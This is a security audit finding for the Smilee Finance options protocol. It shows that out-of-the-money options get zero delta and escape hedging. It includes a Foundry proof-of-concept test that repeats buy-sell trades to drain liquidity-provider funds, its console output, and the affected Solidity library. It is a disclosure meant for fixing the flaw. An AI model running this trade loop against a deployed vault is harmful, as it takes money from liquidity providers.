{
  "Title": "M-7: Trading out of the money options has delta = 0 which breaks protocol assumptions of traders profit being fully hedged and can result in a loss of funds to LPs",
  "Content": "# Issue M-7: Trading out of the money options has delta = 0 which breaks protocol assumptions of traders profit being fully hedged and can result in a loss of funds to LPs \n\nSource: https://github.com/sherlock-audit/2024-02-smilee-finance-judging/issues/97 \n\nThe protocol has acknowledged this issue.\n\n## Found by \npanprog\n## Summary\n\nSmilee protocol fully hedges all traders pnl by re-balancing the vault between base and side tokens after each trade. This is the assumption about this from the docs:\n> This ensures Smilee has always the correct exposure to the reference tokens to:\n> - Cover Impermanent Gain payoffs, no matter how much money traders earn and when they trade.\n> - Ensure Liquidity Providers gets the same payoff of a DEX LP*\n> - Ensure the protocol is not exposed to any shortfall.\nhttps://docs.smilee.finance/protocol-design/delta-hedging\n\nIn the other words, any profit for traders is taken from the hedge and not from the vault Liquidity Providers funds. LP payoff must be at least the underlying DEX (Uniswap) payoff without fees with the same settings.\n\nHowever, out of the money options (IG Bull when `price < strike` or IG Bear when `price > strike`) have `delta = 0`, meaning that trading such options doesn't influence vault re-balancing. Since the price of these options changes depending on current asset price, any profit gained by traders from these trades is not hedged and thus becomes the loss of the vault LPs, breaking the assumption referenced above.\n\nAs a result, LPs payout can becomes less than underlying DEX LPs payout without fees. And in extreme cases the vault funds might not be enough to cover traders payoff.\n\n## Vulnerability Detail\n\nWhen the vault delta hedges its position after each trade, it only hedges in the money options, ignoring any out of the money options. For example, this is the calculation of the IG Bull delta (`s` is the current asset price, `k` is the strike):\n```solidity\n    /**\n        Δ_bull = (1 / θ) * F\n        F = {\n@@@         * 0                     if (S < K)\n            * (1 - √(K / Kb)) / K   if (S > Kb)\n            * 1 / K - 1 / √(S * K)  if (K < S < Kb)\n        }\n    */\n    function bullDelta(uint256 k, uint256 kB, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s <= k) {\n@@@         return 0;\n        }\n```\n\nThis is example scenario to demonstrate the issue:\n- strike = 1\n- vault has deposits = 2 (base = 1, side = 1), available liquidity: bull = 1, bear = 1\n- trader buys 1 IG bear. This ensures that no vault re-balance happens when `price < strike`\n- price drops to 0.9. Trader buys 1 IG bull (premium paid = 0.000038)\n- price raises to 0.99. Trader sells 1 IG bull (premium received = 0.001138). Trader profit = 0.0011\n- price is back to 1. Trader sells back 1 IG bear.\n- at this point the vault has (base = 0.9989, side = 1), meaning LPs have lost some funds when the price = strike.\n\nWhile the damage from 1 trade is not large, if this is repeated several times, the damage to LP funds will keep inceasing.\n\nThis can be especially dangerous if very long dated expiries are used, for example annual IG options. If the asset price remains below the strike for most of the time and IG Bear liquidity is close to 100% usage, then **all** IG Bull trades will be unhedged, thus breaking the core protocol assumption that traders profit should not translate to LPs loss: in such case traders profit will be the same loss for LPs. In extreme volatility, if price drops by 50% then recovers, traders can profit 3% of the vault with each trade, so after 33 trades the vault will be fully drained.\n\n## Impact\n\nIn some specific trading conditions (IG Bear liquidity used close to 100% if price < strike, or IG Bull liquidity used close to 100% if price > strike), all or most of the traders pnl is not hedged and thus becomes loss or profit of the LPs, breaking the core protocol assumptions about hedging and in extreme cases can drain significant percentage of the vault (LPs) funds, up to a point of not being able to payout traders payoff.\n\n## Proof Of Concept\n\nCopy to `attack.t.sol`:\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\nimport {UD60x18, ud, convert} from \"@prb/math/UD60x18.sol\";\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IPositionManager} from \"@project/interfaces/IPositionManager.sol\";\nimport {Epoch} from \"@project/lib/EpochController.sol\";\nimport {AmountsMath} from \"@project/lib/AmountsMath.sol\";\nimport {EpochFrequency} from \"@project/lib/EpochFrequency.sol\";\nimport {OptionStrategy} from \"@project/lib/OptionStrategy.sol\";\nimport {AddressProvider} from \"@project/AddressProvider.sol\";\nimport {MarketOracle} from \"@project/MarketOracle.sol\";\nimport {FeeManager} from \"@project/FeeManager.sol\";\nimport {Vault} from \"@project/Vault.sol\";\nimport {TestnetToken} from \"@project/testnet/TestnetToken.sol\";\nimport {TestnetPriceOracle} from \"@project/testnet/TestnetPriceOracle.sol\";\nimport {DVPUtils} from \"./utils/DVPUtils.sol\";\nimport {TokenUtils} from \"./utils/TokenUtils.sol\";\nimport {Utils} from \"./utils/Utils.sol\";\nimport {VaultUtils} from \"./utils/VaultUtils.sol\";\nimport {MockedIG} from \"./mock/MockedIG.sol\";\nimport {MockedRegistry} from \"./mock/MockedRegistry.sol\";\nimport {MockedVault} from \"./mock/MockedVault.sol\";\nimport {TestnetSwapAdapter} from \"@project/testnet/TestnetSwapAdapter.sol\";\nimport {PositionManager} from \"@project/periphery/PositionManager.sol\";\n\n\ncontract IGTradeTest is Test {\n    using AmountsMath for uint256;\n\n    address admin = address(0x1);\n\n    // User of Vault\n    address alice = address(0x2);\n    address bob = address(0x3);\n\n    //User of DVP\n    address charlie = address(0x4);\n    address david = address(0x5);\n\n    AddressProvider ap;\n    TestnetToken baseToken;\n    TestnetToken sideToken;\n    FeeManager feeManager;\n\n    MockedRegistry registry;\n\n    MockedVault vault;\n    MockedIG ig;\n    TestnetPriceOracle priceOracle;\n    TestnetSwapAdapter exchange;\n    uint _strike;\n\n    function setUp() public {\n        vm.warp(EpochFrequency.REF_TS);\n        //ToDo: Replace with Factory\n        vm.startPrank(admin);\n        ap = new AddressProvider(0);\n        registry = new MockedRegistry();\n        ap.grantRole(ap.ROLE_ADMIN(), admin);\n        registry.grantRole(registry.ROLE_ADMIN(), admin);\n        ap.setRegistry(address(registry));\n\n        vm.stopPrank();\n\n        vault = MockedVault(VaultUtils.createVault(EpochFrequency.WEEKLY, ap, admin, vm));\n        priceOracle = TestnetPriceOracle(ap.priceOracle());\n\n        baseToken = TestnetToken(vault.baseToken());\n        sideToken = TestnetToken(vault.sideToken());\n\n        vm.startPrank(admin);\n       \n        ig = new MockedIG(address(vault), address(ap));\n        ig.grantRole(ig.ROLE_ADMIN(), admin);\n        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);\n        vault.grantRole(vault.ROLE_ADMIN(), admin);\n        vm.stopPrank();\n        ig.setOptionPrice(1e3);\n        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1\n        ig.useRealDeltaHedge();\n        ig.useRealPercentage();\n        ig.useRealPremium();\n\n        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);\n\n        vm.prank(admin);\n        registry.registerDVP(address(ig));\n        vm.prank(admin);\n        MockedVault(vault).setAllowedDVP(address(ig));\n        feeManager = FeeManager(ap.feeManager());\n\n        exchange = TestnetSwapAdapter(ap.exchangeAdapter());\n    }\n\n    // try to buy/sell ig bull below strike for user's profit\n    // this will not be hedged, and thus the vault should lose funds\n    function test() public {\n        _strike = 1e18;\n        vm.prank(admin);\n        priceOracle.setTokenPrice(address(sideToken), _strike);\n        VaultUtils.addVaultDeposit(alice, 1e18, admin, address(vault), vm);\n        VaultUtils.addVaultDeposit(bob, 1e18, admin, address(vault), vm);\n\n        Utils.skipWeek(true, vm);\n\n        vm.prank(admin);\n        ig.rollEpoch();\n\n        VaultUtils.logState(vault);\n        DVPUtils.debugState(ig);\n\n        // to ensure no rebalance from price movement\n        console.log(\"Buy 100% IG BEAR @ 1.0\");\n        testBuyOption(1e18, 0, 1e18);\n\n        for (uint i = 0; i < 20; i++) {\n            // price moves down, we buy\n            vm.warp(block.timestamp + 1 hours);\n            console.log(\"Buy 100% IG BULL @ 0.9\");\n            testBuyOption(0.9e18, 1e18, 0);\n\n            // price moves up, we sell\n            vm.warp(block.timestamp + 1 hours);\n            console.log(\"Sell 100% IG BULL @ 0.99\");\n            testSellOption(0.99e18, 1e18, 0);\n        }\n\n        // sell back original\n        console.log(\"Sell 100% IG BEAR @ 1.0\");\n        testSellOption(1e18, 0, 1e18);\n    }\n\n    function testBuyOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {\n\n        vm.prank(admin);\n        priceOracle.setTokenPrice(address(sideToken), price);\n\n        (uint256 premium, uint256 fee) = _assurePremium(charlie, _strike, optionAmountUp, optionAmountDown);\n\n        vm.startPrank(charlie);\n        premium = ig.mint(charlie, _strike, optionAmountUp, optionAmountDown, premium, 10e18, 0);\n        vm.stopPrank();\n\n        console.log(\"premium\", premium);\n        (uint256 btAmount, uint256 stAmount) = vault.balances();\n        console.log(\"base token notional\", btAmount);\n        console.log(\"side token notional\", stAmount);\n    }\n\n    function testSellOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {\n        vm.prank(admin);\n        priceOracle.setTokenPrice(address(sideToken), price);\n\n        uint256 charliePayoff;\n        uint256 charliePayoffFee;\n        {\n            vm.startPrank(charlie);\n            (charliePayoff, charliePayoffFee) = ig.payoff(\n                ig.currentEpoch(),\n                _strike,\n                optionAmountUp,\n                optionAmountDown\n            );\n\n            charliePayoff = ig.burn(\n                ig.currentEpoch(),\n                charlie,\n                _strike,\n                optionAmountUp,\n                optionAmountDown,\n                charliePayoff,\n                0.1e18\n            );\n            vm.stopPrank();\n\n            console.log(\"payoff received\", charliePayoff);\n            (uint256 btAmount, uint256 stAmount) = vault.balances();\n            console.log(\"base token notional\", btAmount);\n            console.log(\"side token notional\", stAmount);\n        }\n    }\n\n    function _assurePremium(\n        address user,\n        uint256 strike,\n        uint256 amountUp,\n        uint256 amountDown\n    ) private returns (uint256 premium_, uint256 fee) {\n        (premium_, fee) = ig.premium(strike, amountUp, amountDown);\n        TokenUtils.provideApprovedTokens(admin, address(baseToken), user, address(ig), premium_*5, vm);\n    }\n}\n```\n\nExecution console:\n```solidity\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n  dead false\n  lockedInitially 2000000000000000000\n...\n  Buy 100% IG BEAR @ 1.0\n  premium 6140201098441368\n  base token notional 1006140201098441412\n  side token notional 999999999999999956\n  Buy 100% IG BULL @ 0.9\n  premium 3853262173300493\n  base token notional 1009993463271741905\n  side token notional 999999999999999956\n  Sell 100% IG BULL @ 0.99\n  payoff received 4865770659690694\n  base token notional 1005127692612051211\n  side token notional 999999999999999956\n...\n  Buy 100% IG BULL @ 0.9\n  premium 1827837493502948\n  base token notional 984975976168184269\n  side token notional 999999999999999956\n  Sell 100% IG BULL @ 0.99\n  payoff received 3172781130161218\n  base token notional 981803195038023051\n  side token notional 999999999999999956\n  Sell 100% IG BEAR @ 1.0\n  payoff received 3269654020920760\n  base token notional 978533541017102291\n  side token notional 999999999999999956\n```\n\nNotice:\n1. Initial vault balance at the asset price of 1.0 is base = 1, side = 1\n2. All IG Bull trades do not change vault side token balance (no re-balancing happens)\n3. After 20 trades, at the asset price of 1.0, base = 0.9785, side = 1\n\nThis means that 20 profitable trades create a 1.07% loss for the vault.\nSimilar scenario for annual options with 50% price move shows 3% vault loss per trade.\n\n## Code Snippet\n\n`FinanceIGDelta.bullDelta` OTM delta = 0:\nhttps://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/FinanceIGDelta.sol#L122-L134\n\n`FinanceIGDelta.bearDelta` OTM delta = 0:\nhttps://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/FinanceIGDelta.sol#L144-L156\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe issue seems to be from the approximation of the delta for OTM options. Statistically, long-term, the issue shouldn't be a problem as the long-term expectation is positive for the LPs profit due to it. However, short-term, the traders profit can create issues, and this seems to be the protocol's core assumption. Possible solution can include more precise delta calculation, maybe still approximation, but slightly more precise than the current approximation used. \n\nAlternatively, keep track of underlying DEX equivalent of LP payoff at the current price and if, after the trade, vault's notional is less than that, add fee = the difference, to ensure that the assumption above is always true (similar to how underlying DEX slippage is added as a fee).\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid; medium(11)\n\n\n\n**metadato-eth**\n\nAcknowledged but not fixed.. We tested it and it does not generate any issue a part from super extreme/ super unlikely scenarios.\n \n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/180",
  "Code": [
    {
      "filename": "smilee-v2-contracts/src/lib/FinanceIGDelta.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.19;\n\nimport {SD59x18, sd, convert as convertint} from \"@prb/math/SD59x18.sol\";\nimport {UD60x18, ud, convert} from \"@prb/math/UD60x18.sol\";\nimport {AmountsMath} from \"./AmountsMath.sol\";\nimport {SignedMath} from \"./SignedMath.sol\";\n\n/// @title Implementation of core financial computations for Smilee protocol\nlibrary FinanceIGDelta {\n    /// @notice A wrapper for the input parameters of delta perc functions\n    struct Parameters {\n        // strike\n        uint256 k;\n        // lower bound liquidity range\n        uint256 kA;\n        // upper bound liquidity range\n        uint256 kB;\n        // reference price\n        uint256 s;\n        // theta factor\n        uint256 theta;\n    }\n\n    struct DeltaHedgeParameters {\n        int256 igDBull;\n        int256 igDBear;\n        uint8 baseTokenDecimals;\n        uint8 sideTokenDecimals;\n        uint256 initialLiquidityBull;\n        uint256 initialLiquidityBear;\n        uint256 availableLiquidityBull;\n        uint256 availableLiquidityBear;\n        uint256 sideTokensAmount;\n        int256 notionalUp;\n        int256 notionalDown;\n        uint256 strike;\n        uint256 theta;\n        uint256 kb;\n    }\n\n    int256 internal constant _MAX_EXP = 133_084258667509499441;\n\n    /**\n        @notice Computes unitary delta hedge quantity for bull/bear options\n        @param params The set of Parameters to compute deltas\n        @return igDBull The unitary integer quantity of side token to hedge a bull position\n        @return igDBear The unitary integer quantity of side token to hedge a bear position\n        @dev the formulas are the ones for different ranges of liquidity\n    */\n    function deltaHedgePercentages(Parameters calldata params) external pure returns (int256 igDBull, int256 igDBear) {\n        igDBull = bullDelta(params.k, params.kB, params.s, params.theta);\n        igDBear = bearDelta(params.k, params.kA, params.s, params.theta);\n    }\n\n    /**\n        @notice Gives the amount of side tokens to swap in order to hedge protocol delta exposure\n        @param params The DeltaHedgeParameters info\n        @return tokensToSwap An integer amount, positive when there are side tokens in excess (need to sell) and negative vice versa\n        @dev This is what's called `h` in the papers\n     */\n    function deltaHedgeAmount(DeltaHedgeParameters memory params) public pure returns (int256 tokensToSwap) {\n        params.initialLiquidityBull = AmountsMath.wrapDecimals(params.initialLiquidityBull, params.baseTokenDecimals);\n        params.initialLiquidityBear = AmountsMath.wrapDecimals(params.initialLiquidityBear, params.baseTokenDecimals);\n        params.availableLiquidityBull = AmountsMath.wrapDecimals(\n            params.availableLiquidityBull,\n            params.baseTokenDecimals\n        );\n        params.availableLiquidityBear = AmountsMath.wrapDecimals(\n            params.availableLiquidityBear,\n            params.baseTokenDecimals\n        );\n\n        uint256 notionalBull = AmountsMath.wrapDecimals(SignedMath.abs(params.notionalUp), params.baseTokenDecimals);\n        uint256 notionalBear = AmountsMath.wrapDecimals(SignedMath.abs(params.notionalDown), params.baseTokenDecimals);\n        params.sideTokensAmount = AmountsMath.wrapDecimals(params.sideTokensAmount, params.sideTokenDecimals);\n\n        uint256 protoNotionalBull = params.notionalUp >= 0\n            ? ud(params.availableLiquidityBull).sub(ud(notionalBull)).unwrap()\n            : ud(params.availableLiquidityBull).add(ud(notionalBull)).unwrap();\n\n        uint256 protoNotionalBear = params.notionalDown >= 0\n            ? ud(params.availableLiquidityBear).sub(ud(notionalBear)).unwrap()\n            : ud(params.availableLiquidityBear).add(ud(notionalBear)).unwrap();\n\n        uint256 protoDBull = 2 * ud(SignedMath.abs(params.igDBull))\n            .mul(ud(protoNotionalBull))\n            .unwrap();\n        uint256 protoDBear = 2 * ud(SignedMath.abs(params.igDBear))\n            .mul(ud(protoNotionalBear))\n            .unwrap();\n\n        uint256 deltaLimit;\n        {\n            UD60x18 v0 = ud(params.initialLiquidityBull + params.initialLiquidityBear);\n            UD60x18 strike = ud(params.strike);\n            UD60x18 theta = ud(params.theta);\n            UD60x18 kb = ud(params.kb);\n            // DeltaLimit := v0 / (θ * k) - v0 / (θ * √(K * Kb))\n            deltaLimit = v0.div(theta.mul(strike)).sub(v0.div(theta.mul(strike.mul(kb).sqrt()))).unwrap();\n        }\n\n        tokensToSwap =\n            SignedMath.revabs(protoDBull, params.igDBull >= 0) +\n            SignedMath.revabs(protoDBear, params.igDBear >= 0) +\n            SignedMath.castInt(params.sideTokensAmount) -\n            SignedMath.castInt(deltaLimit);\n\n        // due to sqrt computation error, sideTokens to sell may be very few more than available\n        if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n            if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n                tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n            }\n        }\n        params.sideTokensAmount = SignedMath.abs(tokensToSwap);\n        params.sideTokensAmount = AmountsMath.unwrapDecimals(params.sideTokensAmount, params.sideTokenDecimals);\n        tokensToSwap = SignedMath.revabs(params.sideTokensAmount, tokensToSwap >= 0);\n    }\n\n    ////// HELPERS //////\n\n    /**\n        Δ_bull = (1 / θ) * F\n        F = {\n            * 0                     if (S < K)\n            * (1 - √(K / Kb)) / K   if (S > Kb)\n            * 1 / K - 1 / √(S * K)  if (K < S < Kb)\n        }\n    */\n    function bullDelta(uint256 k, uint256 kB, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s <= k) {\n            return 0;\n        }\n        if (s > kB) {\n            delta = (convertint(1).sub((sd(int256(k)).div(sd(int256(kB)))).sqrt())).div(sd(int256(k)));\n        } else {\n            // if (k < s < kB)\n            delta = _inRangeDelta(k, s);\n        }\n        return delta.div(sd(int256(theta))).unwrap();\n    }\n\n    /**\n        Δ_bear = (1 / θ) * F\n        F = {\n            * (1 - √(K / Ka)) / K   if (S < Ka)\n            * 0                     if (S > K)\n            * 1 / K - 1 / √(S * K)  if (Ka < S < K)\n        }\n    */\n    function bearDelta(uint256 k, uint256 kA, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s >= k) {\n            return 0;\n        }\n        if (s < kA) {\n            delta = (convertint(1).sub((sd(int256(k)).div(sd(int256(kA)))).sqrt())).div(sd(int256(k)));\n        } else {\n            // if (kA < s < k)\n            delta = _inRangeDelta(k, s);\n        }\n        return delta.div(sd(int256(theta))).unwrap();\n    }\n\n    /// @dev (1 / K) - 1 / √(S * K)\n    function _inRangeDelta(uint256 k, uint256 s) internal pure returns (SD59x18) {\n        return (convertint(1).div(sd(int256(k)))).sub(convertint(1).div((sd(int256(s)).mul(sd(int256(k))).sqrt())));\n    }\n}"
    },
    {
      "filename": "smilee-v2-contracts/src/lib/FinanceIGDelta.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.19;\n\nimport {SD59x18, sd, convert as convertint} from \"@prb/math/SD59x18.sol\";\nimport {UD60x18, ud, convert} from \"@prb/math/UD60x18.sol\";\nimport {AmountsMath} from \"./AmountsMath.sol\";\nimport {SignedMath} from \"./SignedMath.sol\";\n\n/// @title Implementation of core financial computations for Smilee protocol\nlibrary FinanceIGDelta {\n    /// @notice A wrapper for the input parameters of delta perc functions\n    struct Parameters {\n        // strike\n        uint256 k;\n        // lower bound liquidity range\n        uint256 kA;\n        // upper bound liquidity range\n        uint256 kB;\n        // reference price\n        uint256 s;\n        // theta factor\n        uint256 theta;\n    }\n\n    struct DeltaHedgeParameters {\n        int256 igDBull;\n        int256 igDBear;\n        uint8 baseTokenDecimals;\n        uint8 sideTokenDecimals;\n        uint256 initialLiquidityBull;\n        uint256 initialLiquidityBear;\n        uint256 availableLiquidityBull;\n        uint256 availableLiquidityBear;\n        uint256 sideTokensAmount;\n        int256 notionalUp;\n        int256 notionalDown;\n        uint256 strike;\n        uint256 theta;\n        uint256 kb;\n    }\n\n    int256 internal constant _MAX_EXP = 133_084258667509499441;\n\n    /**\n        @notice Computes unitary delta hedge quantity for bull/bear options\n        @param params The set of Parameters to compute deltas\n        @return igDBull The unitary integer quantity of side token to hedge a bull position\n        @return igDBear The unitary integer quantity of side token to hedge a bear position\n        @dev the formulas are the ones for different ranges of liquidity\n    */\n    function deltaHedgePercentages(Parameters calldata params) external pure returns (int256 igDBull, int256 igDBear) {\n        igDBull = bullDelta(params.k, params.kB, params.s, params.theta);\n        igDBear = bearDelta(params.k, params.kA, params.s, params.theta);\n    }\n\n    /**\n        @notice Gives the amount of side tokens to swap in order to hedge protocol delta exposure\n        @param params The DeltaHedgeParameters info\n        @return tokensToSwap An integer amount, positive when there are side tokens in excess (need to sell) and negative vice versa\n        @dev This is what's called `h` in the papers\n     */\n    function deltaHedgeAmount(DeltaHedgeParameters memory params) public pure returns (int256 tokensToSwap) {\n        params.initialLiquidityBull = AmountsMath.wrapDecimals(params.initialLiquidityBull, params.baseTokenDecimals);\n        params.initialLiquidityBear = AmountsMath.wrapDecimals(params.initialLiquidityBear, params.baseTokenDecimals);\n        params.availableLiquidityBull = AmountsMath.wrapDecimals(\n            params.availableLiquidityBull,\n            params.baseTokenDecimals\n        );\n        params.availableLiquidityBear = AmountsMath.wrapDecimals(\n            params.availableLiquidityBear,\n            params.baseTokenDecimals\n        );\n\n        uint256 notionalBull = AmountsMath.wrapDecimals(SignedMath.abs(params.notionalUp), params.baseTokenDecimals);\n        uint256 notionalBear = AmountsMath.wrapDecimals(SignedMath.abs(params.notionalDown), params.baseTokenDecimals);\n        params.sideTokensAmount = AmountsMath.wrapDecimals(params.sideTokensAmount, params.sideTokenDecimals);\n\n        uint256 protoNotionalBull = params.notionalUp >= 0\n            ? ud(params.availableLiquidityBull).sub(ud(notionalBull)).unwrap()\n            : ud(params.availableLiquidityBull).add(ud(notionalBull)).unwrap();\n\n        uint256 protoNotionalBear = params.notionalDown >= 0\n            ? ud(params.availableLiquidityBear).sub(ud(notionalBear)).unwrap()\n            : ud(params.availableLiquidityBear).add(ud(notionalBear)).unwrap();\n\n        uint256 protoDBull = 2 * ud(SignedMath.abs(params.igDBull))\n            .mul(ud(protoNotionalBull))\n            .unwrap();\n        uint256 protoDBear = 2 * ud(SignedMath.abs(params.igDBear))\n            .mul(ud(protoNotionalBear))\n            .unwrap();\n\n        uint256 deltaLimit;\n        {\n            UD60x18 v0 = ud(params.initialLiquidityBull + params.initialLiquidityBear);\n            UD60x18 strike = ud(params.strike);\n            UD60x18 theta = ud(params.theta);\n            UD60x18 kb = ud(params.kb);\n            // DeltaLimit := v0 / (θ * k) - v0 / (θ * √(K * Kb))\n            deltaLimit = v0.div(theta.mul(strike)).sub(v0.div(theta.mul(strike.mul(kb).sqrt()))).unwrap();\n        }\n\n        tokensToSwap =\n            SignedMath.revabs(protoDBull, params.igDBull >= 0) +\n            SignedMath.revabs(protoDBear, params.igDBear >= 0) +\n            SignedMath.castInt(params.sideTokensAmount) -\n            SignedMath.castInt(deltaLimit);\n\n        // due to sqrt computation error, sideTokens to sell may be very few more than available\n        if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n            if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n                tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n            }\n        }\n        params.sideTokensAmount = SignedMath.abs(tokensToSwap);\n        params.sideTokensAmount = AmountsMath.unwrapDecimals(params.sideTokensAmount, params.sideTokenDecimals);\n        tokensToSwap = SignedMath.revabs(params.sideTokensAmount, tokensToSwap >= 0);\n    }\n\n    ////// HELPERS //////\n\n    /**\n        Δ_bull = (1 / θ) * F\n        F = {\n            * 0                     if (S < K)\n            * (1 - √(K / Kb)) / K   if (S > Kb)\n            * 1 / K - 1 / √(S * K)  if (K < S < Kb)\n        }\n    */\n    function bullDelta(uint256 k, uint256 kB, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s <= k) {\n            return 0;\n        }\n        if (s > kB) {\n            delta = (convertint(1).sub((sd(int256(k)).div(sd(int256(kB)))).sqrt())).div(sd(int256(k)));\n        } else {\n            // if (k < s < kB)\n            delta = _inRangeDelta(k, s);\n        }\n        return delta.div(sd(int256(theta))).unwrap();\n    }\n\n    /**\n        Δ_bear = (1 / θ) * F\n        F = {\n            * (1 - √(K / Ka)) / K   if (S < Ka)\n            * 0                     if (S > K)\n            * 1 / K - 1 / √(S * K)  if (Ka < S < K)\n        }\n    */\n    function bearDelta(uint256 k, uint256 kA, uint256 s, uint256 theta) internal pure returns (int256) {\n        SD59x18 delta;\n        if (s >= k) {\n            return 0;\n        }\n        if (s < kA) {\n            delta = (convertint(1).sub((sd(int256(k)).div(sd(int256(kA)))).sqrt())).div(sd(int256(k)));\n        } else {\n            // if (kA < s < k)\n            delta = _inRangeDelta(k, s);\n        }\n        return delta.div(sd(int256(theta))).unwrap();\n    }\n\n    /// @dev (1 / K) - 1 / √(S * K)\n    function _inRangeDelta(uint256 k, uint256 s) internal pure returns (SD59x18) {\n        return (convertint(1).div(sd(int256(k)))).sub(convertint(1).div((sd(int256(s)).mul(sd(int256(k))).sqrt())));\n    }\n}"
    }
  ]
}